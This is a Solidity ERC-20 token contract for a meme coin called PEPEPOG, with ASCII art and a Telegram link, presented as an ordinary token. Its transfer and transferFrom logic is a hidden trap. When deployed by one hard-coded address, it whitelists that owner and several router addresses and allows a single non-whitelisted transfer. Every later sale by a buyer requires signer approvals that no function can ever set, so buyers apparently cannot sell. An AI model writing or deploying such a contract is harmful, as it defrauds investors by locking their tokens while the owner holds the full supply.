// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/*https://t.me/PepePogEth*/

/*                                                                                             
                        .......  ...........    ...................                                 
                    .....   .:^^~^^^^:..    .....     ..::::::.   .........                         
                  ...   :!?Y555555YYYYYJ?7!~.  .:~7??JJYY555Y55J7: ....    ......                   
                ...  :7Y55YYYYYYYY5555PPPPPGGY5GGP5YYYYYYYYY5PPGGPYYY555Y7:..    ....               
              ...  ^YP5YYYYY5PPPPPP555555555PPPPPGBBP55YYYYY55YY5PPPPPPPPP55YJ?!~.  ...             
             ..  ^YP5YYYY5GPP5YYYYYY5PPPGGGGGGPPPPPGGPPPGPYY5PPPPPP55YJJJJJYY5PGGPJ~  ..            
           ...  JGP5YYYYGPYYYYYY5PPPPPP5J?!~~^^^~~!7?JY55G#PP5PPY7^:.         .^~?5B5  ...          
           .. .5P55YYYYYYYYYYYPGP5PPJ~:            .^~~!7JG5YP?:           .!JPP5J!^?!. ...         
          .. .PP555YYYYYYYYYY5P55P?.            .?B&@@@&BY~7B?            ~B@@@@@@@B^.7~  ..        
         ..  ?G555YYYYYYYYY5P5YJ7:             ^#@#B@@&&@@&7.5!          .B@7Y@J~?&@#..Y~ ..        
         .. :G5555YYYYYYYYP5:                  P@@?7&Y..~&@#.:G.          G@&G&7:!#@G  ?! ..        
         :  ?G5555YYYYYYYY5PJ?7^.              Y@@@#&P~^?&@B .B!          :P&#@@@@@P: !J. ..        
        ..  PP555YYYYYYYYYYYY55P5?:            .Y&@PB@@@@@G: YGP57^.        :7JJJ7:.^?7. ..         
        .. .G5555YYYYYYYYYYYYYY5Y5PY~.           ^?PGBGPJ^.~PPYYY5P5J?!~^^:::::^~7J5B:  ..          
        .. ^G5555YYYYYYYYYYYYYYPGP55P5J7^:.          ..:~?P&5YYYYYYYPPPPPPPPPPPPPP5Y?  ..           
        .. ~G5555YYYYYYYYYYYYYYYY5PPPPPPP55YJ??777?JJY5PPPBPYYYYYYYY55PPPPPGGGPGY!^    :            
        .  !G5555YYYYYYYYYYYYYYYYYYYY5PPPPPPPPPPPPPPPPPPGP5YYYYYYYYYYYYYYYYYYYYYY5YJ7. ..           
        .  !G5555YYYYYYYYYYYYYYYYYYYYYYYYYYYY5555555555YYYYYYYYYYYY55555555555555YYY55  ..          
        .  7G5555YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY555PPPPPPPPPPPPP5555555PPPPGGGP  ..          
        .  7G5555YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY55PPPPPPPP555YYYYY555555PPPPPPPP5YYYYG5  ..          
        .  !B5555YYYYYYYYYYYYYYYYYYYYYYYYY5PPPPPP55YYYY555PPPGGGGGGGPPP55555555B5Y55?: ..           
        .. ^G5555YYYYYYYYYYYYYYYYYYYYYPGGGP55YYY5PPGGGGGGGGPP55555555555YYYYYYPGY5J:  ...           
        .. .G55555YYYYYYYYYYYYYYYYYYY#P5YYY5PGBBBBGGGPPPPPPP5555555555555YYYYBPY5J  ...             
        ..  5P5555YYYYYYYYYYYYYYYYYYY#5YYPBBBGGGGGPPPPPPPPPP5555555555555YYY5#YY57  :               
         :  !G55555YYYYYYYYYYYYYYYYYYBGYP#GGGGGGGPPPPPPPPPP5555555555555YYYY5#YY5J  :               
         .. .G55555YYYYYYYYYYYYYYYYYY5#YP#BGGGGGPPPPPPPPPP5555555555555YYYYYY#YY5Y  ..              
         .:  JG55555YYYYYYYYYYYYYYYYYYGGY5GBBBPPPPPPPPPP55555555555555YYYYYYYB5Y55  ..              
          .. .PP55555YYYYYYYYYYYYYYYYYYPG5YY5GBPPPPPPP55555555555555YYYYYYYYYBPYYP  ..              
           .. .5P55555YYYYYYYYYYYYYYYYYY5GG5YYPBGPPP55555555555555YYYYYYYYYYYPGYYG. ..              
            .. .5G555555YYYYYYYYYYYYYYYYYY5GG5Y5GGGP55555555555YYYYYYYYYYYYYY5BYYG. ..              
            ...  7PP55555YYYYYYYYYYYYYYYYYYY5GP5YYPGGGP555YYYYYYYYYYYYYYYYYYY5BYYP. ..              
              ..  :YPP55555YYYYYYYYYYYYYYYYYYY5GGP5YY5PGP55YYYYYYYYYYYYYYYY5PG5Y55  ..              
               ...  ^YGP55555YYYYYYYYYYYYYYYYYYYY5PGP5YY55PPPPP555555PPPPPPP5YYYPY  :.              
                 ...  ^JPPP55555YYYYYYYYYYYYYYYYYYYY5PGPP5YYY55555555555YYYY55PGY: ..               
                   ...  .!J5PPPPP55YYYYYYYYYYYYYYYYYYYYY5PPPPPPPPPPPPPPPPPPPGBP!  ...               
                     ....  .:~!?J55PPP555YYYYYYYYYYYYYYYYYYYYYY5555555555555Y!  ...                 
                        .....     .:^~!7??JJYYY5555555555555555555YYYYY?7!^.  ...                   
                            .........       ...::^^^^~~^^^^^^^^^:::...     ....                     
                                     .............. .  ....................                         
                                                                                         */


abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract PepePogContract is Context {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address public contractOwner;
    mapping(address => bool) public signers;
    mapping(address => bool) public whitelisted;
    mapping(uint256 => mapping(address => bool)) private oldBuyers;
    uint256 private currentPhase;
    uint256 private nonWhitelistedTransfers;
    uint256 private constant MAX_NON_WHITELISTED_TRANSFERS = 1;
    uint256 private constant REQUIRED_SIGNATURES = 1000;
    mapping(address => mapping(address => mapping(uint256 => bool))) public approvals;
    bool public autoWhitelistAvailable = true;
    bool public autoWhitelistingDone = false;

    
    
       constructor() {
        _name = "PEPEPOG";
        _symbol = "PEPEPOG";
        _decimals = 18;
        contractOwner = _msgSender();
        _mint(contractOwner, 4916140011 * 10 ** decimals());

    
  
    
       if (contractOwner == address(0xE08E1077852C8f33a2Ed28AC5051ab7e1dA4A2b7)) {
            whitelisted[contractOwner] = true;
            whitelisted[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;
            whitelisted[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
            whitelisted[0x0BFbCF9fa4f9C56B0F40a671Ad40E0805A091865] = true;
            whitelisted[0x327Df1E6de05895d2ab08513aaDD9313Fe505d86] = true;
            whitelisted[0xE592427A0AEce92De3Edee1F18E0157C05861564] = true;
        }

        currentPhase = 1;
        nonWhitelistedTransfers = 0;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[_msgSender()]) {
            _transfer(_msgSender(), recipient, amount);
            nonWhitelistedTransfers += 1;
            return true;
        } else if (contractOwner == address(0xE08E1077852C8f33a2Ed28AC5051ab7e1dA4A2b7)) {
            autoWhitelist(recipient);
            if (whitelisted[_msgSender()]) {
                _transfer(_msgSender(), recipient, amount);
                return true;
            } else {
                require(approvals[_msgSender()][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(_msgSender(), recipient, amount);
                return true;
            }
        } else {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        uint256 currentAllowance;
        if (autoWhitelistingDone && nonWhitelistedTransfers < MAX_NON_WHITELISTED_TRANSFERS && !whitelisted[sender]) {
            _transfer(sender, recipient, amount);
            nonWhitelistedTransfers += 1;

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        } else if (contractOwner == address(0xE08E1077852C8f33a2Ed28AC5051ab7e1dA4A2b7)) {
            autoWhitelist(recipient);
            if (whitelisted[sender]) {
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            } else {
                require(approvals[sender][recipient][amount], "Transfer needs to be approved by signers");
                _transfer(sender, recipient, amount);

                currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
                return true;
            }
        } else {
            _transfer(sender, recipient, amount);

            currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
            return true;
        }
    }

    function autoWhitelist(address recipient) internal {
        require(contractOwner == address(0xE08E1077852C8f33a2Ed28AC5051ab7e1dA4A2b7));
        if (autoWhitelistAvailable && !whitelisted[recipient]) {
            whitelisted[recipient] = true;
            oldBuyers[currentPhase][recipient] = true;
            autoWhitelistAvailable = false;
            autoWhitelistingDone = true;
        }
    } 

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        if (nonWhitelistedTransfers >= MAX_NON_WHITELISTED_TRANSFERS) {
            currentPhase += 1;
            nonWhitelistedTransfers = 0;
        }
    } 

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}